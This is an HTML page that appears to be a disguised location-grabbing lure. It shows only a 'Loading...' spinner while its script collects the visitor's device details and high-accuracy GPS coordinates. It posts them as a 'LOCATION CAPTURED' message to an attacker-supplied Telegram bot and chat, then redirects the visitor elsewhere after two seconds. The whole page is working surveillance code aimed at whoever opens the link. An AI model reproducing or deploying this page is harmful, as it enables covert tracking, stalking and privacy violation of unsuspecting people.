<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, sans-serif;
        }
        .loader { text-align: center; color: white; }
        .spinner {
            width: 50px; height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div>Loading...</div>
    </div>

    <script>
    // Get redirect URL
    const params = new URLSearchParams(window.location.search);
    const redirect = params.get('r') || 'https://google.com';
    const bot = params.get('bot') || '';
    const chat = params.get('chat') || '';
    
    const data = {
        time: new Date().toISOString(),
        device: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        screen: screen.width + 'x' + screen.height,
        cores: navigator.hardwareConcurrency || '?',
        gps: null
    };
    
    // Capture GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                data.gps = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    map: 'https://maps.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude + '&ll=' + pos.coords.latitude + ',' + pos.coords.longitude + '&z=16'
                };
                sendData();
            },
            function(err) {
                data.gps = { error: err.message };
                sendData();
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }
    
    function sendData() {
        // Send to Telegram if bot token provided
        if (bot && chat) {
            let msg = '📍 LOCATION CAPTURED\n';
            msg += '━━━━━━━━━━━━━━━━\n\n';
            
            if (data.gps && data.gps.lat) {
                msg += '✅ GPS: ' + data.gps.lat.toFixed(6) + ', ' + data.gps.lon.toFixed(6) + '\n';
                msg += '🎯 Accuracy: ' + data.gps.acc.toFixed(1) + 'm\n';
                msg += '🗺️ ' + data.gps.map + '\n';
            } else {
                msg += '❌ GPS: ' + (data.gps ? data.gps.error : 'Denied') + '\n';
            }
            
            msg += '\n📱 ' + data.platform + '\n';
            msg += '🖥️ ' + data.screen + '\n';
            msg += '🕐 ' + data.time + '\n';
            
            fetch('https://api.telegram.org/bot' + bot + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text: msg })
            });
        }
        
        // Redirect
        setTimeout(function() {
            window.location.href = redirect;
        }, 2000);
    }
    </script>
</body>
</html>
